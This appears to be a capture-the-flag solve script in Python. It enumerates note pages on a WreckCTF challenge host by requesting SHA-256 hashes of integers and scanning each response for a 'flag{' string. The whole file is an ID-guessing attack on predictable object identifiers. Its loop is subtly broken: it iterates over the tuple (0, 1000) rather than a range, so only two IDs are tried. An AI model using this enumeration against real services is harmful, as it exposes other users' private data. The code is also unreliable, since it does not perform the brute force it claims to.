#! /usr/bin/env python
import requests
import hashlib
import codecs
import re
import colorama
colorama.init(autoreset=True)
def flagReader(wrd):
    result = re.search(r"flag{",wrd.decode())
    if result != None:
        return True
    else: 
        return False
#Creating the id
for i in (0,1000):
    i = str(i)
    i = i.encode('utf-8')
    hash = hashlib.sha256(i)
    d = hash.digest()
    dt = codecs.encode(d,'hex')
    id = dt.decode('utf-8')
    req = requests.get(f"https://notes-1.challs.wreckctf.com/view/{id}")
    print(req.content)
    if flagReader(req.content) == True:
        print(f"{colorama.Fore.RED}{req.content}")
        break
